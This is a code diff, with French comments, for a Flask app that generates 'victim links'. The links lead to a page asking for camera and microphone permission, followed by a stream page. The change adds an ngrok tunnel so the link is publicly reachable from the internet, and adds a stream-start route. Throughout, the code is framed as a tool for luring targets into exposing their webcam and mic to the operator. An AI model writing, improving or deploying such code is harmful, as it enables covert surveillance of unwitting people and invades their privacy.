@@ -1,7 +1,7 @@
 from flask import Flask, render_template, request, jsonify
 import socket
-import random
 import pyfiglet
+from pyngrok import ngrok  # Bibliothèque Ngrok
 
 # Créer une interface ASCII art avec pyfiglet
 def display_interface():
@@ -38,11 +38,7 @@ def get_local_ip():
         s.close()
     return ip
 
-# Générer un port aléatoire
-def get_random_port():
-    return random.randint(5000, 65535)
-
-# Route pour la page principale (affichage du formulaire pour la victime)
+# Route pour la page principale
 @app.route("/")
 def index():
     return render_template("index.html")
@@ -51,29 +47,34 @@ def index():
 @app.route("/generate_victim_link", methods=["POST"])
 def generate_victim_link():
     input_link = request.form['input_link']
-    local_ip = get_local_ip()
-    port = get_random_port()
-    # Générer un lien unique pour la victime
-    victim_link = f"http://{local_ip}:{port}/victim_permission"
-    
-    # Affiche le lien généré dans le terminal
+    # Lien Ngrok public généré
+    ngrok_tunnel = ngrok.connect(port)
+    public_url = ngrok_tunnel.public_url
+    victim_link = f"{public_url}/victim_permission"
     print(f"Lien généré pour la victime : {victim_link}")
-    
     return render_template("generated_link.html", victim_link=victim_link)
 
-# Route pour la page de demande d'autorisation de la caméra et du micro
+# Route pour demander la permission de caméra et micro
 @app.route("/victim_permission")
 def victim_permission():
     return render_template("victim_permission.html")
 
+# Route pour commencer le stream
+@app.route("/start_stream", methods=["POST"])
+def start_stream():
+    # Crée un lien local pour diffuser le flux
+    stream_url = f"http://{local_ip}:{port}/stream"
+    return jsonify({"stream_url": stream_url})
+
 # Route pour afficher le flux vidéo et audio
 @app.route("/stream")
 def stream():
-    # Ici, le flux sera géré par une solution externe
     return render_template("stream.html")
 
+# Lancer le serveur Flask
 if __name__ == "__main__":
+    # Fixer un port unique
+    port = 5000  # Port standard
     local_ip = get_local_ip()
-    port = get_random_port()
-    print(f"Serveur en cours d'exécution : http://{local_ip}:{port}")
+    print(f"Serveur en cours d'exécution sur : http://{local_ip}:{port}")
     app.run(host="0.0.0.0", port=port)
